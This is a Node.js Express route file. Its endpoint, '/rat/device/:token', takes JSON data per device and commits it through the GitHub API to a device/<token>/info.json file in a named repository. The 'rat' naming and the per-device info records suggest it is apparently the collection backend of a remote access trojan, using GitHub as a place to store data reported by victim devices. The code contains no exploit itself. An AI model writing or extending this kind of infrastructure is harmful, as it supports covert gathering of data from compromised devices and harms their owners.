module.exports = function(app) {
    const axios = require('axios');
    const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
    const GITHUB_USER = 'daffaadev';
    const GITHUB_REPO = 'api';

    app.get('/rat/device/:token', async (req, res) => {
        res.setHeader('Access-Control-Allow-Origin', '*');

        try {
            const { token } = req.params;
            const { q } = req.query;

            if (!token || !q) {
                return res.status(400).json({
                    success: false,
                    message: 'Invalid parameters.'
                });
            }

            let parsedData;
            try {
                parsedData = JSON.parse(q);
            } catch (e) {
                return res.status(400).json({
                    success: false,
                    message: 'Invalid parameters.'
                });
            }

            const filePath = `device/${token}/info.json`;

            let fileExists = false;
            let currentSha = null;
            try {
                const checkRes = await axios.get(
                    `https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${filePath}`,
                    {
                        headers: {
                            'Authorization': `token ${GITHUB_TOKEN}`,
                            'Accept': 'application/vnd.github.v3+json'
                        }
                    }
                );
                fileExists = true;
                currentSha = checkRes.data.sha;
            } catch (e) {
                fileExists = false;
            }

            if (!fileExists) {
                return res.status(404).json({
                    success: false,
                    message: 'Invalid parameters.'
                });
            }

            const formattedJson = JSON.stringify(parsedData, null, 2);
            const contentBase64 = Buffer.from(formattedJson).toString('base64');

            await axios.put(
                `https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/contents/${filePath}`,
                {
                    message: `Update info.json for token ${token}`,
                    content: contentBase64,
                    sha: currentSha || undefined
                },
                {
                    headers: {
                        'Authorization': `token ${GITHUB_TOKEN}`,
                        'Accept': 'application/vnd.github.v3+json'
                    }
                }
            );

            res.status(200).json({
                success: true,
                message: 'Success.'
            });

        } catch (error) {
            res.status(500).json({
                success: false,
                message: 'Invalid parameters.'
            });
        }
    });
};
